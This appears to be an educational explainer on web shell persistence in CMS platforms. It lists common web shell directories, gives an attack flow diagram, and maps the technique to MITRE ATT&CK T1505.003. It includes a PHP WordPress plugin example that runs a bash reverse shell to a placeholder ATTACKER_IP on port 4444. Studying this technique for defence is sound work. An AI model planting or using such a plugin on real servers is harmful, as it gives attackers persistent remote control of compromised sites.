# Web Shell Persistence

## Overview

Web shell persistence is a technique where an attacker maintains long-term access to a compromised web server by abusing server-side scripting capabilities.

It is commonly seen in CMS platforms such as WordPress, Joomla, Drupal, and custom PHP applications where user-controlled file execution is possible.

Because web servers continuously process HTTP requests, any malicious or modified server-side script can provide persistent execution capability as long as it remains accessible.

---

## Common Web Shell Locations

### Web Root Directories

```text id="ws1"
/var/www/html/
/var/www/
/usr/share/nginx/html/
```

---

### CMS-Specific Directories

```text id="ws2"
WordPress:
/wp-content/plugins/
/wp-content/themes/
/wp-content/uploads/

Joomla:
/components/
/modules/
/templates/
```

---

### Upload Directories

```text id="ws3"
/uploads/
/media/
/images/
```

Often targeted because they allow file uploads.

---

## Execution Flow

```text
Attacker Gains Web Access
        │
        ▼
Uploads or Modifies PHP File
        │
        ▼
File Stored in Web Directory
        │
        ▼
User or Attacker Sends HTTP Request
        │
        ▼
Web Server Executes PHP Code
        │
        ▼
Persistent Access via Web Layer
```

---

## Example Scenario (Plugin Abuse Concept)

A common persistence method is modifying a CMS plugin so that it executes server-side logic whenever the plugin is loaded.

Example of a malicious reverse shell plugin structure:

```php
<?php
/**
 * Plugin Name: Reverse Shell Plugin
 * Description: opens a reverse shell with bash
 * Version: 0.1
 */

exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");
?>
```

When placed in a plugin directory, the web server executes this code when the plugin is loaded.

---

## Why Web Shell Persistence is Effective

* Executes through standard HTTP requests
* Blends with normal web application behavior
* Operates under web server privileges (www-data / apache)
* Does not require system-level access
* Works even without SSH access
* Common in real-world CMS compromises

---

## Related MITRE ATT&CK Technique

**T1505.003 – Server Software Component: Web Shell**

---

## Summary

Web shell persistence leverages server-side execution capabilities in web applications to maintain long-term access to compromised systems. Because web servers are continuously exposed to network traffic, they provide an effective and reliable execution layer for attackers once initial access is achieved.
